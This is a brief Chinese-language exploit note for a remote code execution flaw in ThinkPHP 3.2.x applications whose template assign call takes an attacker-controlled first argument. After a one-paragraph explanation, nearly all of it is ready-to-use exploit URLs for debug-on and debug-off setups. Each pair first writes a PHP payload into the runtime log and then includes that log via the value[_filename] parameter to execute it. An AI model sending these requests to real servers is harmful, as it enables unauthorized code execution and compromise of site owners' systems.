## ThinkPHP3.2.x RCE

​	在ThinkPHP3.2.x框架的程序中，如果要在模板中输出变量，需要在控制器中把变量传递给模板，系统提供了assign方法对模板变量赋值，本漏洞的利用条件为assign方法的第一个变量可控。

Ver：

- ThinkPHP 3.2.X

Exp：  
debug关闭：  

```
1、/index.php?m=--><?=phpinfo();?>
2、http://127.0.0.1/index.php?0=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_07_13.log
```
debug开启：  

```
1、/index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> 
2、http://127.0.0.1/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_07_13.log
```
